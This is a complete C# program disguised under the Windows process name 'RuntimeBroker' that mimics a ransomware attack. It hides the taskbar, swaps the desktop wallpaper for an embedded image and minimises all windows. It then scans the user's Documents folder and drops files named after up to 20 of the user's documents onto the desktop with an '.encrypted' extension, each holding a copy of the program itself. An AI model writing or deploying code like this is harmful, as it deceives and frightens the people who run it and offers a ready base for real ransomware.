using System.Reflection;
using System.Runtime.InteropServices;

namespace RuntimeBroker
{
    internal class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

        private static readonly uint SPI_SETDESKWALLPAPER = 20;
        private static readonly uint SPIF_UPDATEINIFILE = 0x1;

        private const int WM_COMMAND = 0x111;
        private const int MIN_ALL = 419;

        [Flags]
        private enum SetWindowPosFlags : uint
        {
            HideWindow = 128,
            ShowWindow = 64
        }

        public static void WriteResourceToFile(string resourceName, string fileName)
        {
            using var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
            using var file = new FileStream(fileName, FileMode.Create, FileAccess.Write);
            resource?.CopyTo(file);
        }

        static void Main(string[] args)
        {
            var window = FindWindow("Shell_traywnd", "");
            _ = SetWindowPos(window, IntPtr.Zero, 0, 0, 0, 0, (uint)SetWindowPosFlags.HideWindow);

            var filePath = Path.GetTempFileName();

            WriteResourceToFile("RuntimeBroker.wallpaper.jpg", filePath);

            _ = SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, filePath, SPIF_UPDATEINIFILE);

            var lHwnd = FindWindow("Shell_TrayWnd", "");
            _ = SendMessage(lHwnd, WM_COMMAND, MIN_ALL, IntPtr.Zero);

            var docs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.*", SearchOption.AllDirectories);

            var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var currentBytes = File.ReadAllBytes(Environment.ProcessPath ?? Path.GetRandomFileName());

            foreach (var docFile in docs.Take(20))
            {
                File.WriteAllBytes(Path.Combine(desktopPath, new FileInfo(docFile).Name) + ".encrypted", currentBytes);
            }
        }
    }
}